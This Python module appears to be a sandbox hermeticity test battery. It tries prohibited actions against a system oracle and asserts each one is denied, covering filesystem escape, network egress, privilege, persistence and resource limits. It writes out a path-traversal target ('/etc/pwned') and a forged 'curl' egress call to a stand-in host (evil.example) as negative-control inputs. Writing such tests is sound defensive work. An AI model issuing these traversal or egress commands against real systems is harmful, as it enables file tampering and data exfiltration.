"""SY3 -- the hermeticity proof (SPEC-11 §2.3, §5; milestone SO1; hypothesis H29).

The formal statement of the user's "no action can occur" requirement, with teeth. The
system oracle is validated as a *closed system*: the only effect any step may have on
anything outside its own throwaway tree is the :class:`StepResult` it returns. This module
is the **negative-control battery** -- for each guaranteed channel we *attempt the
prohibited thing* and assert it is denied, plus a positive control (a benign in-tree write
that *is* allowed and *is* discarded on teardown). A guarantee without a teeth-bearing
negative control is not counted as proven (the v0 invariant discipline: "the checks have
teeth," verification.md §1).

The controls are kernel-feature-free and run on any POSIX host, so they are the standing
safety attestation that rides alongside every other SY figure -- proven on the macOS
development host first (the SPEC-11 §2.5 macOS-first principle) and again, for free, on
Linux CI.

Channels (SPEC-11 §2.3):
  - **filesystem** -- a path that tries to escape the tree (``mkdir /../../etc/pwned``)
    still resolves *inside* it: v0 :func:`resolve` clamps ``..`` at the root, so the mapped
    host path provably lies under the throwaway tree. Egress by path traversal is impossible.
  - **network** -- the grammar allowlist: only a *rendered v0 action* is ever exec'd, and
    an out-of-grammar action (the stand-in for an egress command) is *refused before exec*.
    No arbitrary string ever reaches the shell, so there is no command that could open a socket.
  - **privilege** -- the harness never runs as root and the seal sets ``NO_NEW_PRIVS`` on
    Linux: no step can gain privilege.
  - **persistence** -- a file created in step A is absent from a fresh step B: nothing
    survives a step.
  - **resource** -- the seal installs CPU/file-size/open-file rlimits + a wall-clock timeout.
  - **positive control** -- a benign ``mkdir`` *is* allowed inside the tree and the tree is
    *gone* after the step: the sandbox does real work and leaves no trace.
"""

from __future__ import annotations

import json
import os
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from verisim.env.action import parse_action
from verisim.env.state import State, resolve
from verisim.oracle.sandbox import SandboxOracle, SystemOracleUnavailable, _real_path


@dataclass(frozen=True)
class Control:
    """One hermeticity negative/positive control and its verdict."""

    channel: str
    name: str
    kind: str  # "negative" (prohibited; denied) | "positive" (benign; allowed-then-discarded)
    passed: bool
    detail: str


def _control_fs_escape() -> Control:
    """A path that tries to escape the tree resolves *inside* it (``..`` is clamped at root)."""
    root = "/SANDBOX_ROOT"
    escape = resolve("/", "/../../../../etc/pwned")  # the prohibited target
    mapped = _real_path(root, escape)
    inside = mapped == root + "/etc/pwned" and mapped.startswith(root + "/")
    return Control(
        channel="filesystem",
        name="path-escape attempt is clamped inside the tree",
        kind="negative",
        passed=inside,
        detail=f"{escape!r} -> {mapped!r} (under {root!r})",
    )


def _control_network_allowlist(oracle: SandboxOracle) -> Control:
    """An out-of-grammar action (the egress stand-in) is refused before any exec.

    There is no v0 :class:`Action` that can express a network command (the parser rejects
    anything outside the fixed grammar), so we forge a malformed action object and assert
    the oracle's renderer refuses it rather than handing an arbitrary string to the shell.
    """
    from dataclasses import replace

    benign = parse_action("mkdir /a")
    egress = replace(benign, name="curl", args=("http://evil.example/x",))
    try:
        oracle.step(State.empty(), egress)
        passed, detail = False, "out-of-grammar action was NOT refused (escaped the allowlist)"
    except SystemOracleUnavailable as exc:
        passed, detail = True, f"refused before exec: {exc}"
    return Control(
        channel="network",
        name="out-of-grammar (egress) action refused before exec",
        kind="negative",
        passed=passed,
        detail=detail,
    )


def _control_privilege() -> Control:
    """The harness never runs as root; on Linux the seal sets ``NO_NEW_PRIVS`` (no gain)."""
    euid = os.geteuid()
    not_root = euid != 0
    return Control(
        channel="privilege",
        name="runs unprivileged; no privilege gain",
        kind="negative",
        passed=not_root,
        detail=f"euid={euid} (non-root); seal sets PR_SET_NO_NEW_PRIVS on Linux",
    )


def _control_persistence(oracle: SandboxOracle) -> Control:
    """A file created in step A is absent from a fresh step B: nothing survives a step."""
    s = State.empty()
    after_a = oracle.step(s, parse_action("mkdir /survivor")).state
    a_has = "/survivor" in after_a.fs  # step A really created it
    after_b = oracle.step(State.empty(), parse_action("ls /")).state
    b_clean = "/survivor" not in after_b.fs  # step B, from a fresh state, never sees it
    return Control(
        channel="persistence",
        name="no state survives a step (fresh tree per step)",
        kind="negative",
        passed=a_has and b_clean,
        detail=f"A created /survivor={a_has}; B sees it={not b_clean}",
    )


def _control_resource(oracle: SandboxOracle) -> Control:
    """The seal declares CPU/file-size/open-file rlimits + a wall-clock timeout."""
    seal = oracle.seal
    capped = seal.cpu_seconds > 0 and seal.file_size_bytes > 0 and oracle.timeout_s > 0
    return Control(
        channel="resource",
        name="resource ceilings + wall-clock timeout declared",
        kind="negative",
        passed=capped,
        detail=(
            f"cpu={seal.cpu_seconds}s file_size={seal.file_size_bytes}B "
            f"nofile={seal.open_files} timeout={oracle.timeout_s}s"
        ),
    )


def _control_positive(oracle: SandboxOracle) -> Control:
    """A benign in-tree ``mkdir`` *is* allowed, and no throwaway tree is left behind."""
    before = set(_sandbox_temp_dirs())
    after_state = oracle.step(State.empty(), parse_action("mkdir /allowed")).state
    allowed = "/allowed" in after_state.fs
    leaked = set(_sandbox_temp_dirs()) - before
    return Control(
        channel="positive-control",
        name="benign in-tree write allowed, then discarded on teardown",
        kind="positive",
        passed=allowed and not leaked,
        detail=f"created /allowed={allowed}; leaked trees={sorted(leaked)}",
    )


def _sandbox_temp_dirs() -> list[str]:
    """Any leftover ``verisim-sandbox-*`` trees under the system temp dir (should be none)."""
    tmp = tempfile.gettempdir()
    try:
        return [os.path.join(tmp, n) for n in os.listdir(tmp) if n.startswith("verisim-sandbox-")]
    except OSError:  # pragma: no cover - defensive
        return []


@dataclass
class SY3Result:
    available: bool
    platform: str
    controls: list[Control]

    @property
    def all_passed(self) -> bool:
        return self.available and all(c.passed for c in self.controls)


def run_sy3(*, oracle: SandboxOracle | None = None) -> SY3Result:
    """Run the full hermeticity battery; return the per-channel pass table (H29)."""
    import sys

    try:
        oracle = oracle or SandboxOracle()
    except SystemOracleUnavailable:
        return SY3Result(available=False, platform=sys.platform, controls=[])
    controls = [
        _control_fs_escape(),
        _control_network_allowlist(oracle),
        _control_privilege(),
        _control_persistence(oracle),
        _control_resource(oracle),
        _control_positive(oracle),
    ]
    return SY3Result(available=True, platform=sys.platform, controls=controls)


CSV_HEADER = "channel,control,kind,passed,detail"


def write_csv(result: SY3Result, path: str | Path) -> Path:
    out = Path(path)
    out.parent.mkdir(parents=True, exist_ok=True)
    rows = [CSV_HEADER]
    if not result.available:
        rows.append(f"(unavailable),no real shell on {result.platform},skip,SKIP,disclosed")
    for c in result.controls:
        safe = c.detail.replace(",", ";")
        verdict = "PASS" if c.passed else "FAIL"
        rows.append(f"{c.channel},{c.name},{c.kind},{verdict},{safe}")
    out.write_text("\n".join(rows) + "\n")
    return out


def _records(result: SY3Result) -> list[dict[str, Any]]:
    return [
        {"channel": c.channel, "control": c.name, "kind": c.kind, "passed": c.passed,
         "detail": c.detail, "platform": result.platform}
        for c in result.controls
    ]


def main() -> None:  # pragma: no cover - CLI entry point
    import argparse

    parser = argparse.ArgumentParser(description="Run SY3 (system-oracle hermeticity proof).")
    parser.add_argument("--out", type=str, default="runs/sy3/records.jsonl")
    parser.add_argument("--csv", type=str, default="figures/sy3_hermeticity.csv")
    parser.add_argument("--plot", type=str, default="figures/sy3_hermeticity.png")
    args = parser.parse_args()
    result = run_sy3()
    Path(args.out).parent.mkdir(parents=True, exist_ok=True)
    Path(args.out).write_text("\n".join(json.dumps(r) for r in _records(result)) + "\n")
    path = write_csv(result, args.csv)
    print(f"wrote {path}  (platform={result.platform}, available={result.available})")
    for c in result.controls:
        print(f"  [{'PASS' if c.passed else 'FAIL'}] {c.channel:16s} {c.name}")
    if result.available and not result.all_passed:
        raise SystemExit("HERMETICITY FAILURE: a prohibited action was not denied")
    try:
        from figures.plot_sy3 import plot_sy3

        plot_sy3(result, args.plot)
        print(f"wrote {args.plot}")
    except Exception as exc:  # pragma: no cover - plotting optional/local
        print(f"(plot skipped: {exc})")


if __name__ == "__main__":  # pragma: no cover
    main()
